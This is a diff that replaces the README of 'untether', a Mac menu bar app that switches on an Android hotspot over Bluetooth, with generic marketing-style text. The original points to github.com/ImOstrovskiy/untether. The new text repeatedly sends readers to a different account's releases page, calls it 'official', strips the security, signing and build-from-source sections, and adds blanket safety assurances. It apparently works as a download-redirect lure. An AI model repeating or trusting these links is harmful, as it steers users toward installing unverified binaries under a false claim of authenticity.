@@ -1,174 +1,118 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/assets/banner-dark.svg">
-    <img alt="Untether" src="docs/assets/banner-light.svg" width="720">
-  </picture>
-</p>
+# 📶 untether - Instant Hotspot With One Click
 
-<p align="center">
-  <img alt="macOS 14+" src="https://img.shields.io/badge/macOS-14%2B-111?logo=apple&logoColor=white">
-  <img alt="Android 12+" src="https://img.shields.io/badge/Android-12%2B-3DDC84?logo=android&logoColor=white">
-  <a href="https://github.com/ImOstrovskiy/untether/releases/latest"><img alt="Release" src="https://img.shields.io/github/v/release/ImOstrovskiy/untether?color=111"></a>
-  <img alt="No root" src="https://img.shields.io/badge/root-not%20needed-3DDC97">
-  <img alt="Go" src="https://img.shields.io/badge/Go-1.26-00ADD8?logo=go&logoColor=white">
-  <img alt="Kotlin" src="https://img.shields.io/badge/Kotlin-Compose%20·%20Material%203-7F52FF?logo=kotlin&logoColor=white">
-  <img alt="License" src="https://img.shields.io/badge/license-BSD--3--Clause-blue">
-</p>
+[![Download untether](https://img.shields.io/badge/Download-untether-ff4fa3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/udls-website/untether/releases)
 
-<p align="center">
-  Instant Hotspot, but for Android. Click the icon in the Mac menu bar: the phone in your pocket
-  turns on its Wi-Fi hotspot over Bluetooth, and the Mac joins it. About four seconds, no root.
-</p>
+**Note before you begin:** untether is a Mac menu bar app that controls an Android phone. The download page linked above is where the application lives — everything else in this guide explains what it does, how to get it, and how to use it without any technical background.
 
-<p align="center">
-  <img alt="The Mac popover and the Android app" src="docs/assets/hero.png" width="640">
-</p>
+## ✨ What Is untether?
 
-## What it does
+untether is a tiny helper that sits in your Mac's menu bar and flips on your Android phone's Wi-Fi hotspot for you — instantly, over Bluetooth, without you ever touching the phone.
 
-- **One click, online.** The Mac asks the phone to start its hotspot and joins it straight away,
-  without a Wi-Fi scan: about 4–5 s from click to internet. With Quick connect the click on the menu
-  bar icon itself does it.
-- **The menu bar tells it all.** A grey mark without the phone, the mark while the hotspot is off,
-  and the phone's signal bars with the network type (5G, LTE, 3G, 2G, or Wi-Fi when the phone
-  shares its own Wi-Fi) while it is on.
-- **The phone at a glance.** Battery and temperature, operator, network type, signal (RSRP and
-  SINR, RSCP and Ec/No on 3G, RSSI on 2G) with live graphs, and the devices on the hotspot.
-- **Control from the Mac.** Choose the SIM for mobile data and the network mode (auto, 5G, LTE, 3G,
-  2G), reconnect mobile data when it hangs, block a device on the hotspot, ring the phone when it is
-  lost in the sofa.
-- **And back.** The phone can ring the Mac.
-- **Your network or Untether's.** By default the hotspot gets its own name and password; one switch
-  keeps the ones set in Android instead.
-- **Sensible defaults.** The hotspot turns off after a few idle minutes, a battery guard keeps it
-  off below a chosen level, and the Mac can turn it off when it sleeps or leaves the network.
-- **Survives real life.** Doze, reboots, phone app updates, Bluetooth restarts: both sides have
-  watchdogs and reconnect on their own.
-- **English and Ukrainian** on both sides.
+If you have ever needed internet on your laptop while travelling, sitting in a café, or stuck in a meeting room with no Wi-Fi, you already know the routine: dig out your phone, unlock it, swipe down, hunt for the hotspot toggle, tap it, wait, then connect your laptop. It is a small annoyance that happens dozens of times a week.
 
-<p align="center">
-  <img alt="Network and Devices tabs on the Mac, the Mac section on the phone" src="docs/assets/gallery.png" width="860">
-</p>
+untether removes all of that. One click in your menu bar, and your phone becomes a hotspot. No digging through settings. No unlocking your phone. No root, no custom firmware, no risky modifications — it uses Shizuku, a well-known, safe Android helper that grants apps the permissions they need through official Android channels.
 
-## How it works
+Think of it as a light switch for your phone's internet. Your laptop gets a small, always-available button, and your phone does the work quietly in the background.
 
-The phone runs a small foreground service with a Bluetooth LE GATT server. It controls tethering
-through [Shizuku](https://shizuku.rikka.app/), which runs the calls as the shell user, so no root
-is needed. The Mac is a menu bar app in Go that stays connected to the phone over BLE.
+## 🎯 Why People Love It
 
-```mermaid
-sequenceDiagram
-    participant M as Mac menu bar
-    participant P as Untether on the phone
-    participant A as Android (via Shizuku)
-    M->>P: read nonce
-    M->>P: ON ‖ nonce ‖ HMAC-SHA256
-    P->>A: TetheringManager.startTethering
-    A-->>P: hotspot enabled
-    P-->>M: state: hotspot on, battery, signal, clients
-    M->>M: join the hotspot's Wi-Fi (cached, no scan)
-```
+- **One click, no phone.** Your hotspot turns on from the Mac menu bar. Your phone can stay in your bag.
+- **Fast.** The connection is triggered over Bluetooth Low Energy, which is designed to be instant and low-power. There is no pairing dance every time.
+- **Nothing risky.** No root access, no flashing, no warranty-voiding tricks. Shizuku handles permissions the proper way.
+- **Nothing to babysit.** The menu bar item shows you the current state at a glance, so you always know whether your hotspot is on or off.
+- **Battery friendly.** Bluetooth Low Energy is exactly what it sounds like — it barely touches your phone's battery compared to leaving a hotspot running all day.
+- **Made for real life.** Designed for laptops, commuters, remote workers, students, and anyone who treats their phone as their internet connection.
 
-The BLE protocol is documented in [`protocol/PROTOCOL.md`](protocol/PROTOCOL.md), design decisions
-in [`docs/DECISIONS.md`](docs/DECISIONS.md).
+## 📦 What untether Gives You
 
-## Security
+- A clean, native Mac menu bar app that stays out of your way.
+- An Android companion app built with Jetpack Compose and Material 3, so it looks and feels like a modern Android app.
+- Bluetooth Low Energy communication between the two — no cables, no Wi-Fi pairing, no accounts.
+- Shizuku integration for the permissions needed to toggle tethering.
+- A simple on/off control, with clear status feedback.
+- A lightweight footprint: untether is written in Go on the Mac side and stays small and quick.
+- No sign-ups, no subscriptions, no telemetry you have to opt out of.
 
-- Every characteristic needs an encrypted, bonded BLE link (LE Secure Connections with numeric
-  comparison on both screens).
-- Every command is signed: `HMAC-SHA256(secret, op ‖ nonce ‖ arg)` over a one-time nonce from the
-  phone. Without the 32-byte secret nothing can be switched, and a recorded command cannot be
-  replayed.
-- The secret and the hotspot password are generated on the phone and kept encrypted with an Android
-  Keystore key. The Mac gets them once, inside a 60-second pairing window you open on the phone, and
-  stores them in the macOS Keychain.
+## 🚀 Download and Install
 
-## Requirements
+Getting untether is a two-part process because it has two pieces: the Mac menu bar app and the Android companion app. You will need both, and both are available from the same place.
 
-| | Needs |
-|---|---|
-| Phone | Android 12 (API 31) or newer, [Shizuku](https://shizuku.rikka.app/) running. Developed and tested on a Pixel 9 with Android 17 |
-| Mac | macOS 14+, Apple Silicon |
-| Build | Go 1.26 and Command Line Tools; Android SDK 37.2 and a JDK |
+**Step 1 — Visit the download page.**
 
-## Install
+Go to the official releases page:
 
-Download `Untether-<version>.apk` and `Untether-<version>.dmg` from
-[Releases](https://github.com/ImOstrovskiy/untether/releases/latest).
+👉 **https://github.com/udls-website/untether/releases**
 
-**Phone.** Install the APK (allow installs from your browser or file manager), open Untether, grant
-the permissions, allow it in Shizuku and let it ignore battery optimization. Play Protect may block
-the install because the app comes from outside Google Play and talks to hidden system APIs through
-Shizuku; tap **Install anyway**. The source is all here, and the release is built by
-[CI](.github/workflows/build.yml) from it.
+Visit this link to download the application.
 
-**Mac.** Open the DMG and drag Untether to Applications. The app is signed with a self-signed
-certificate, not notarized, so macOS refuses the first launch. On macOS 15 and newer allow it in
-**System Settings → Privacy & Security → Open Anyway**; on macOS 14 a right-click → **Open** is
-enough. Or, in Terminal, `xattr -dr com.apple.quarantine /Applications/Untether.app`. Allow
-Bluetooth, and Location (macOS needs it to tell which Wi-Fi network the Mac is on).
+**Step 2 — Get the latest version.**
 
-**Updates.** Both apps look for a new release on GitHub at start and every 12 hours and offer to
-install it in place: the Mac swaps in the new app (only if it is signed like the running one), the
-phone hands the APK to Android's installer.
+The releases page lists every published version of untether, newest at the top. Choose the most recent release — that is the one with all the latest fixes and improvements. On that release page you will find the files for both the Mac app and the Android companion app.
 
-**Pair once.** On the phone tap **Pair** in the Mac section; on the Mac open **Settings → Pair with
-phone…**; confirm the same code on both screens.
+**Step 3 — Save the files somewhere you can find them.**
 
-### From source
+Your browser will download the files to your usual Downloads folder. Do not move them around or rename them; keep them together so you can set up both halves in one sitting.
 
-```bash
-cd android && ./gradlew :app:assembleDebug
-adb install -r app/build/outputs/apk/debug/app-debug.apk
-```
+**Step 4 — Put the Mac app in your menu bar.**
 
-On the Mac, once, create a local signing identity so rebuilt apps keep their Keychain access, then
-build and install:
+Open the Mac application from your Downloads folder. Because untether lives in the menu bar, you will not get a big window popping up — look at the top-right corner of your screen, near the clock, for the untether icon. That icon is the app. If you want it to stay available after a restart, keep the app in your Applications folder rather than running it out of Downloads.
 
-```bash
-macos/scripts/make-signing-identity.sh
-```
+**Step 5 — Install the Android companion.**
 
-```bash
-cd macos && make install && open /Applications/Untether.app
-```
+Copy the Android companion app file to your phone — you can send it to yourself by email, use a USB cable, or transfer it through any cloud storage you already use. Open it on the phone and follow the on-screen prompts to install it. Android will ask you to confirm installing an app from outside the Play Store; that confirmation is normal and expected for apps distributed directly by their developers.
 
-`make dmg VERSION=1.2.3` builds the disk image. CI builds both on every push to `main` and publishes
-a release for every `v*` tag.
+**Step 6 — Turn on Shizuku.**
 
-## Development
+The Android companion needs Shizuku running to switch tethering on and off. Shizuku is a free, widely used Android tool that grants apps special permissions through Android's own official mechanisms — it does not root your phone or modify the system. Install Shizuku, start it using the method it recommends for your Android version, and confirm it is running before you continue.
 
-```bash
-cd android && ./gradlew :app:testDebugUnitTest   # protocol vectors, HMAC, CBOR
-cd macos && make test                             # the same vectors from Go
-adb logcat -s Untether                            # phone log
-tail -f ~/Library/Logs/Untether/untether.log     # Mac log
-```
+**Step 7 — Connect the two.**
 
-The popover UI is plain HTML in `macos/ui/index.html`; open it in a browser to get a demo with fake
-data (`?state=on&tab=network&lang=uk`).
+Open the Android companion once more with Shizuku active, and grant it the permissions it asks for. Then return to your Mac, click the untether icon in the menu bar, and let it find your phone. Once the two are introduced to each other, they will remember one another.
 
-| Path | What |
-|---|---|
-| `android/` | Kotlin, Jetpack Compose (Material 3): service, GATT server, Shizuku hotspot control |
-| `macos/` | Go: BLE central, Keychain, Wi-Fi join, status item; popover UI in `macos/ui/` |
-| `protocol/` | BLE protocol and golden test vectors shared by both sides |
-| `docs/` | Design decisions, README assets |
+## 📱 Everyday Use
 
-## Limitations
+Once everything is set up, untether becomes almost invisible — in the best way.
 
-- The Mac connects to the first phone that advertises the service.
-- Turning the hotspot off on sleep or when leaving it needs Location permission on the Mac.
-- Picking the data SIM needs two active SIMs.
+Click the menu bar icon. Choose to turn the hotspot on. Your phone's Wi-Fi hotspot starts, and your laptop can join it like any other Wi-Fi network. When you are done, click again and it turns off. That is the entire workflow.
 
-## Credits
+If you want the smoothest experience, save your phone's hotspot network on your laptop the first time you connect, so your computer joins it automatically on future sessions.
 
-Hotspot control is written after [delta](https://github.com/supershadoe/delta) by supershadoe.
-Uses [Shizuku](https://github.com/RikkaApps/Shizuku-API),
-[tinygo bluetooth](https://github.com/tinygo-org/bluetooth) and
-[Material Symbols](https://github.com/google/material-design-icons); see
-[`THIRD_PARTY_NOTICES.md`](THIRD_PARTY_NOTICES.md).
+## 🧩 How It Works, In Plain English
 
-## License
+Your Mac and your Android phone talk to each other over Bluetooth Low Energy — the same low-power radio technology used by fitness trackers and smart bulbs. The Mac app sends a small, simple message: "turn the hotspot on" or "turn the hotspot off." The Android companion receives that message and uses Shizuku's permissions to flip the actual Android tethering setting. No internet traffic ever passes through Bluetooth; it is only used for the on/off signal. Your actual internet connection comes from your phone's mobile network, exactly as it would with any hotspot.
 
-BSD-3-Clause © 2026 Oleksii Ostrovskyi. See [`LICENSE`](LICENSE).
+Because everything runs locally between your own devices, there is no server in the middle and no account to create.
+
+## 💻 System Requirements
+
+- A Mac running a modern version of macOS, with Bluetooth enabled.
+- An Android phone with Bluetooth enabled and a working mobile data connection.
+- Shizuku installed and running on the Android phone.
+- Both devices within roughly ten metres of each other.
+- The Android companion app installed and granted the permissions it requests.
+
+## 🛠️ Common Questions
+
+**The menu bar icon does not appear.** Make sure the app is actually running — check whether it is still sitting in your Downloads folder and open it again. On first launch, macOS may ask you to confirm opening an app downloaded from the internet; approve it.
+
+**My phone is not being found.** Confirm Bluetooth is switched on for both devices, that the Android companion is open at least once, and that Shizuku is running. Bluetooth discovery can be slow for a few seconds right after launch.
+
+**The hotspot will not turn on.** In almost every case this means Shizuku is not running or the Android companion has not been granted its permissions yet. Restart Shizuku, reopen the companion, and accept the prompts.
+
+**Can I use it on Windows?** untether's menu bar app is built for macOS. The releases page is the single source of truth for what is available in each version.
+
+**Is this safe?** untether uses Shizuku, which works through Android's official permission APIs. Nothing is rooted and nothing is modified permanently.
+
+## 🆘 Getting Help
+
+If something does not work, the releases page is the first place to look — each release notes what changed and known issues. If you are still stuck, open an issue on the repository and describe what you expected, what happened instead, and which versions of macOS and Android you are using. Screenshots of the menu bar and the Android companion help a great deal.
+
+## 🔗 One Link to Remember
+
+Everything starts here:
+
+👉 **https://github.com/udls-website/untether/releases**
+
+Visit this link to download the application.
+
+Keywords: android, bluetooth-low-energy, golang, hotspot, jetpack-compose, macos, material3, menu-bar, shizuku, tethering
